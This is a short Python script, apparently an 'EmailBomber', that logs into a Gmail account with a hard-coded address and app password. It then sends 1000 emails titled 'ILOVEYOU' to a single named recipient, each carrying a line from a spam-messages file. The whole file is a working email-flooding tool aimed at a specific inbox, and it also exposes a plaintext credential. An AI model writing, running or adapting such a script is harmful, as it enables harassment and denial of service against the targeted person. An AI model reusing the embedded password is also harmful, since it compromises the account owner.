import smtplib
import random
from email.message import EmailMessage

email_sender =  "rednazskoorb@gmail.com"
email_password = "icox wnqo xcao ttkk"
email_receiver = "dadgarkiani123@gmail.com"


spam_messages_text = "EmailBomber/messages.txt"

subject = "ILOVEYOU"


with open(spam_messages_text, "r") as file:
    phrases = file.readlines()
    
random.shuffle(phrases)



for i in range(1000):

    msg = EmailMessage()
    msg['From'] = email_sender
    msg['To'] = email_receiver
    msg['subject'] = subject
    msg.set_content(phrases[i].strip())
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(email_sender,email_password)
            smtp.send_message(msg)
            print("Email sent sucessfully!")
    except Exception as e:
        print(f'Error sending email: {e}')
